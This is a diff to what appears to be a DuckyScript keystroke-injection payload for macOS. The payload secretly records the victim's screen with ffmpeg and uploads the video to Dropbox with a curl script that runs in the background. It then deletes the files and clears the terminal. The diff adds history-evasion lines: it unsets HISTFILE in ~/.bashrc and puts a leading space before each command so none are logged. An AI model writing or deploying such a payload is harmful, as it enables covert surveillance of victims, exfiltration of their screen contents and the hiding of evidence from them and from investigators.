@@ -28,7 +28,11 @@ STRING terminal
 DELAY 1000
 ENTER
 DELAY 500
-STRING ffmpeg -f avfoundation -r 30 -i "1" -c:v libx264 -preset ultrafast -tune zerolatency -crf 23 -pix_fmt yuv420p ~/Desktop/screen_recording.mkv
+STRING echo -e "export HISTCONTROL=ignorespace\nunset HISTFILE" >> ~/.bashrc && source ~/.bashrc && exec bash
+DELAY 500
+ENTER
+DELAY 500
+STRING  ffmpeg -f avfoundation -r 30 -i "1" -c:v libx264 -preset ultrafast -tune zerolatency -crf 23 -pix_fmt yuv420p ~/Desktop/screen_recording.mkv
 DELAY 250
 ENTER
 GUI h        ; hides terminal to capture contents on the screen
@@ -37,33 +41,33 @@ GUI TAB      ; reopens terminal to continue script
 DELAY 500
 CTRL C       ; Send the interrupt signal to stop the recording
 DELAY 500
-STRING ffmpeg -i ~/Desktop/screen_recording.mkv -c:v libx264 -preset fast -crf 23 -pix_fmt yuv420p ~/Desktop/screen_recording.mp4
+STRING  ffmpeg -i ~/Desktop/screen_recording.mkv -c:v libx264 -preset fast -crf 23 -pix_fmt yuv420p ~/Desktop/screen_recording.mp4
 DELAY 500
 ENTER
 DELAY 30000
-STRING echo 'curl -X POST "https://content.dropboxapi.com/2/files/upload" -H "Authorization: Bearer <API ACCESS TOKEN HERE>" -H "Dropbox-API-Arg: {\"path\": \"/screen_recording.mp4\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" -H "Content-Type: application/octet-stream" --data-binary "@/Users/<system username here>/Desktop/screen_recording.mp4"' > upload.sh
+STRING  echo 'curl -X POST "https://content.dropboxapi.com/2/files/upload" -H "Authorization: Bearer <API ACCESS TOKEN HERE>" -H "Dropbox-API-Arg: {\"path\": \"/screen_recording.mp4\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" -H "Content-Type: application/octet-stream" --data-binary "@/Users/<system username here>/Desktop/screen_recording.mp4"' > upload.sh
 ENTER
 DELAY 500
-STRING chmod +x upload.sh
+STRING  chmod +x upload.sh
 ENTER
 DELAY 500
-STRING nohup ./upload.sh >/dev/null 2>&1 &
+STRING  nohup ./upload.sh >/dev/null 2>&1 &
 DELAY 500
 ENTER
 DELAY 10000
-STRING rm ~/Desktop/screen_recording.mkv
+STRING  rm ~/Desktop/screen_recording.mkv
 DELAY 250
 ENTER
 DELAY 3000
-STRING rm ~/Desktop/screen_recording.mp4
+STRING  rm ~/Desktop/screen_recording.mp4
 DELAY 250
 ENTER
 DELAY 500
-STRING rm upload.sh
+STRING  rm upload.sh
 DELAY 500
 ENTER
 DELAY 500
-STRING clear
+STRING  clear
 ENTER
 DELAY 500
 GUI w
